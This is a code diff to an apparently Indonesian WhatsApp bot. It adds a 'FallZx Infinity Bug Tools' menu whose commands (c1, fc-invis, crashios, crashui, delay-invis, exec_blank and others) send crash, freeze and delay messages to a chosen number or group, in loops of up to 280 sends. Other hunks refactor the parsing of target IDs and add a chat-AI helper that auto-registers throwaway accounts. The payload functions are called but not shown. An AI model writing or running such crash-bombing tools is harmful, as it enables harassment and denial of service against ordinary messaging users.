@@ -203,12 +203,38 @@ const _isPremActive = (raw) => {
     return Array.isArray(premium) && premium.some(p => _nn(p) === n);
 };
 
-const _resolveTarget = (m, text) => {
-    if (m.mentionedJid && m.mentionedJid[0]) return _jid(m.mentionedJid[0]);
-    if (m.quoted && m.quoted.sender) return _jid(m.quoted.sender);
-    const raw = String(text || '').replace(/[^0-9]/g, '');
-    return raw.length >= 6 ? raw + '@s.whatsapp.net' : null;
+const parseTargetJid = (text, m, sock) => {
+    let target = null;
+    if (m?.mentionedJid && m.mentionedJid[0]) {
+        target = m.mentionedJid[0];
+    } else if (m?.quoted && (m.quoted.sender || m.quoted.key?.participant || m.quoted.key?.remoteJid)) {
+        target = m.quoted.sender || m.quoted.key?.participant || m.quoted.key?.remoteJid;
+    } else if (text && String(text).trim()) {
+        const clean = String(text).trim();
+        if (clean.endsWith('@g.us') || clean.endsWith('@s.whatsapp.net') || clean.endsWith('@lid') || clean.endsWith('@newsletter')) {
+            target = clean;
+        } else {
+            const num = clean.replace(/[^0-9]/g, '');
+            if (num) {
+                if (num.length >= 17 && num.startsWith('120363')) {
+                    target = num + '@g.us';
+                } else {
+                    target = num + '@s.whatsapp.net';
+                }
+            }
+        }
+    } else if (m?.chat) {
+        target = m.chat;
+    }
+    if (!target && m?.from) target = m.from;
+
+    if (target && sock && typeof sock.decodeJid === 'function') {
+        target = sock.decodeJid(target);
+    }
+    return target || m?.chat || '';
 };
+
+const _resolveTarget = (m, text, sock) => parseTargetJid(text, m, sock || global.Elaina);
 
 if (!global._LIMIT_CFG) global._LIMIT_CFG = { free: 20, resetHour: 0 };
 if (!global._LIMIT_MIDNIGHT_STARTED) {
@@ -6388,56 +6414,59 @@ async function _chatgotRegister() {
 }
 
 async function _chatgotAI(prompt, modelKey = 'gpt4omini') {
-    let account = _chatgotReadAcc();
-    if (!account) account = await _chatgotRegister();
-
-    // Login & ambil token
-    let token;
     try {
-        const { data: loginData } = await axios.post('https://api.chatgot.io/api/user/login',
-            { email: account.email, password: account.password },
-            { headers: { 'content-type': 'application/json', 'i-version': '1.1.70', 'i-lang': 'en', 'i-platform': 'web_h5' } }
-        );
-        token = loginData.data.token;
-    } catch (e) {
-        // Akun mungkin expired, register ulang
-        account = await _chatgotRegister();
-        const { data: loginData } = await axios.post('https://api.chatgot.io/api/user/login',
-            { email: account.email, password: account.password },
-            { headers: { 'content-type': 'application/json', 'i-version': '1.1.70', 'i-lang': 'en', 'i-platform': 'web_h5' } }
-        );
-        token = loginData.data.token;
-    }
+        let account = _chatgotReadAcc();
+        if (!account) account = await _chatgotRegister();
 
-    const model = _CHATGOT_MODELS[modelKey] || _CHATGOT_MODELS.gpt4omini;
+        // Login & ambil token
+        let token;
+        try {
+            const { data: loginData } = await axios.post('https://api.chatgot.io/api/user/login',
+                { email: account.email, password: account.password },
+                { headers: { 'content-type': 'application/json', 'i-version': '1.1.70', 'i-lang': 'en', 'i-platform': 'web_h5' }, timeout: 10000 }
+            );
+            token = loginData?.data?.token;
+        } catch (e) {
+            account = await _chatgotRegister();
+            const { data: loginData } = await axios.post('https://api.chatgot.io/api/user/login',
+                { email: account.email, password: account.password },
+                { headers: { 'content-type': 'application/json', 'i-version': '1.1.70', 'i-lang': 'en', 'i-platform': 'web_h5' }, timeout: 10000 }
+            );
+            token = loginData?.data?.token;
+        }
 
-    const res = await axios.post('https://api.chatgot.io/api/v2/chat/conversation', {
-        model, prompt, webAccess: 'close', timezone: 'Asia/Jakarta'
-    }, {
-        headers: {
-            'content-type': 'application/json',
-            authorization: `Bearer ${token}`,
-            'i-version': '1.1.70', 'i-lang': 'en', 'i-platform': 'web_h5'
-        },
-        responseType: 'stream', timeout: 90000
-    });
+        const model = _CHATGOT_MODELS[modelKey] || _CHATGOT_MODELS.gpt4omini;
 
-    return new Promise((resolve, reject) => {
-        let fullText = '';
-        res.data.on('data', chunk => {
-            for (const line of chunk.toString().split('\n')) {
-                if (!line.startsWith('data:')) continue;
-                const json = line.slice(5).trim();
-                if (!json) continue;
-                try {
-                    const parsed = JSON.parse(json);
-                    if (parsed?.data?.content) fullText += parsed.data.content;
-                } catch {}
-            }
+        const res = await axios.post('https://api.chatgot.io/api/v2/chat/conversation', {
+            model, prompt, webAccess: 'close', timezone: 'Asia/Jakarta'
+        }, {
+            headers: {
+                'content-type': 'application/json',
+                authorization: `Bearer ${token}`,
+                'i-version': '1.1.70', 'i-lang': 'en', 'i-platform': 'web_h5'
+            },
+            responseType: 'stream', timeout: 30000
         });
-        res.data.on('end', () => resolve(fullText.trim() || 'AI tidak merespons'));
-        res.data.on('error', reject);
-    });
+
+        return await new Promise((resolve, reject) => {
+            let fullText = '';
+            res.data.on('data', chunk => {
+                for (const line of chunk.toString().split('\n')) {
+                    if (!line.startsWith('data:')) continue;
+                    const json = line.slice(5).trim();
+                    if (!json) continue;
+                    try {
+                        const parsed = JSON.parse(json);
+                        if (parsed?.data?.content) fullText += parsed.data.content;
+                    } catch {}
+                }
+            });
+            res.data.on('end', () => fullText.trim() ? resolve(fullText.trim()) : reject(new Error('AI tidak merespons')));
+            res.data.on('error', reject);
+        });
+    } catch (err) {
+        return await _dolphinAI(prompt);
+    }
 }
 
 // Helper: Dolphin AI (POST streaming)
@@ -11535,6 +11564,133 @@ if (_STORE) {
 }
 
 switch (command) {
+case 'bugmenu':
+case 'kyytools':
+case 'kyyinfi': {
+    const _kyyBugList =
+        `🩸 *FallZx Infinity Bug Tools ϟ*\n\n` +
+        `╭┈┈⬡「 🐛 *ʙᴜɢ ᴍᴇɴᴜ* 」\n` +
+        `┃ • ${prefix}c1 [target/reply/tag] — FC 1 Message\n` +
+        `┃ • ${prefix}fc-1msg [target/reply/tag] — FC 1 Message\n` +
+        `┃ • ${prefix}c2 [target/reply/tag] — FC Invisible\n` +
+        `┃ • ${prefix}fc-invis [target/reply/tag] — FC Invisible\n` +
+        `┃ • ${prefix}delay-invis [target/reply/tag] — Delay Invisible\n` +
+        `┃ • ${prefix}delayhard-invis [target/reply/tag] — Hard Delay\n` +
+        `┃ • ${prefix}crashios [target/reply/tag] — Crash iOS\n` +
+        `┃ • ${prefix}crashui [target/reply/tag] — Crash UI\n` +
+        `┃ • ${prefix}blank-gc — Freeze Blank (GC)\n` +
+        `┃ • ${prefix}exec_blank [gc_id/chat] — Exec Freeze Blank\n` +
+        `╰┈┈┈┈┈┈┈┈⬡\n\n` +
+        `_Powered by FallZx Infinity ϟ_`;
+    await reply(_kyyBugList);
+    break;
+}
+
+case 'c1':
+case 'fc-1msg': {
+    if (!isOwner && !isCreator) return reply('[ ! ] Khusus Owner / Premium');
+    let _kf1Target = parseTargetJid(text, m, Elaina);
+    if (!_kf1Target || _kf1Target === '@s.whatsapp.net') return reply(`Format target tidak valid.\nContoh: ${prefix}c1 628xx atau reply pesan / tag user / kirim di grup`);
+    await Elaina.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });
+    reply(typeof kyyBugRes !== 'undefined' ? kyyBugRes : '🩸 Processing bug request...');
+    for (let i = 0; i < 1; i++) await kyyFc1Msg(_kf1Target);
+    reply(`✅ Berhasil mengirim bug c1 ke\n${_kf1Target}`);
+    break;
+}
+
+case 'c2':
+case 'fc-invis': {
+    if (!isOwner && !isCreator) return reply('[ ! ] Khusus Owner / Premium');
+    let _kfiTarget = parseTargetJid(text, m, Elaina);
+    if (!_kfiTarget || _kfiTarget === '@s.whatsapp.net') return reply(`Format target tidak valid.\nContoh: ${prefix}c2 628xx atau reply pesan / tag user`);
+    await Elaina.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });
+    reply(typeof kyyBugRes !== 'undefined' ? kyyBugRes : '🩸 Processing bug request...');
+    for (let i = 0; i < 10; i++) await kyyInvisGhost(_kfiTarget);
+    reply(`✅ Berhasil mengirim bug fc-invis ke\n${_kfiTarget}`);
+    break;
+}
+
+case 'crashios': {
+    if (!isOwner && !isCreator) return reply('[ ! ] Khusus Owner / Premium');
+    let _kTarget = parseTargetJid(text, m, Elaina);
+    if (!_kTarget || _kTarget === '@s.whatsapp.net') return reply(`Format target tidak valid.\nContoh: ${prefix}crashios 628xx atau reply pesan / tag user`);
+    await Elaina.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });
+    reply(typeof kyyBugRes !== 'undefined' ? kyyBugRes : '🩸 Processing bug request...');
+    for (let i = 0; i < 1; i++) await kyyCrashIos(_kTarget);
+    reply(`✅ Berhasil mengirim bug crashios ke\n${_kTarget}`);
+    break;
+}
+
+case 'crashui': {
+    if (!isOwner && !isCreator) return reply('[ ! ] Khusus Owner / Premium');
+    let _kuiTarget = parseTargetJid(text, m, Elaina);
+    if (!_kuiTarget || _kuiTarget === '@s.whatsapp.net') return reply(`Format target tidak valid.\nContoh: ${prefix}crashui 628xx atau reply pesan / tag user`);
+    await Elaina.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });
+    reply(typeof kyyBugRes !== 'undefined' ? kyyBugRes : '🩸 Processing bug request...');
+    for (let i = 0; i < 1; i++) await kyyUiCrash(_kuiTarget);
+    reply(`✅ Berhasil mengirim bug crashui ke\n${_kuiTarget}`);
+    break;
+}
+
+case 'delay-invis': {
+    if (!isOwner && !isCreator) return reply('[ ! ] Khusus Owner / Premium');
+    let _kdiTarget = parseTargetJid(text, m, Elaina);
+    if (!_kdiTarget || _kdiTarget === '@s.whatsapp.net') return reply(`Format target tidak valid.\nContoh: ${prefix}delay-invis 628xx atau reply pesan / tag user`);
+    await Elaina.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });
+    reply(typeof kyyBugRes !== 'undefined' ? kyyBugRes : '🩸 Processing bug request...');
+    for (let i = 0; i < 15; i++) await kyyInvisLoop(_kdiTarget);
+    reply(`✅ Berhasil mengirim bug delay-invis ke\n${_kdiTarget}`);
+    break;
+}
+
+case 'delayhard-invis': {
+    if (!isOwner && !isCreator) return reply('[ ! ] Khusus Owner / Premium');
+    let _kdhTarget = parseTargetJid(text, m, Elaina);
+    if (!_kdhTarget || _kdhTarget === '@s.whatsapp.net') return reply(`Format target tidak valid.\nContoh: ${prefix}delayhard-invis 628xx atau reply pesan / tag user`);
+    await Elaina.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });
+    reply(typeof kyyBugRes !== 'undefined' ? kyyBugRes : '🩸 Processing bug request...');
+    for (let i = 0; i < 90; i++) await kyyInvisStatus(_kdhTarget);
+    reply(`✅ Berhasil mengirim bug delayhard-invis ke\n${_kdhTarget}`);
+    break;
+}
+
+case 'blank-gc': {
+    if (!isOwner && !isCreator) return reply('[ ! ] Khusus Owner / Premium');
+    let _kbgGroups = await Elaina.groupFetchAllParticipating();
+    let _kbgList = Object.values(_kbgGroups);
+    if (!_kbgList.length) return reply("Bot tidak masuk grup apa pun!");
+    let _kbgSections = _kbgList.map(gc => ({
+        header: `Grup: ${gc.subject}`,
+        rows: [{ title: `Kirim Bug ke ${(gc.subject||'').slice(0,20)}`, description: `${(gc.participants||[]).length} member`, id: `${prefix}exec_blank ${gc.id}` }]
+    }));
+    const _kbgMsg = generateWAMessageFromContent(m.chat, {
+        viewOnceMessage: { message: { messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
+            interactiveMessage: {
+                body: { text: "🩸 *FREEZE X BLANK*\n\nPilih grup target di bawah ini.\n_Powered by FallZx Infinity ϟ_" },
+                nativeFlowMessage: { buttons: [{ name: "single_select", buttonParamsJson: JSON.stringify({ title: "PILIH GRUP TARGET", sections: _kbgSections }) }] }
+            }
+        }}
+    }, { quoted: m }, {});
+    await Elaina.relayMessage(_kbgMsg.key.remoteJid, _kbgMsg.message, { messageId: _kbgMsg.key.id });
+    break;
+}
+
+case 'exec_blank': {
+    if (!isOwner && !isCreator) return reply('[ ! ] Khusus Owner');
+    let _kebTarget = parseTargetJid(text, m, Elaina);
+    const _kebReact = async (emoji) => Elaina.sendMessage(m.chat, { react: { text: emoji, key: m.key } });
+    await _kebReact("🕛"); await sleep(800);
+    await _kebReact("🕞"); await sleep(800);
+    await _kebReact("🕖"); await sleep(800);
+    await _kebReact("✅");
+    reply(`🩸 Sending freeze blank to ${_kebTarget}...`);
+    for (let i = 0; i < 280; i++) {
+        try { await kyyFrezeXblank(_kebTarget); } catch (e) { console.log("Error:", e.message); }
+    }
+    reply(`✅ Done! Sent freeze blank to\n${_kebTarget}`);
+    break;
+}
+
 case 'daftar':
 case 'register':
 case 'signup':
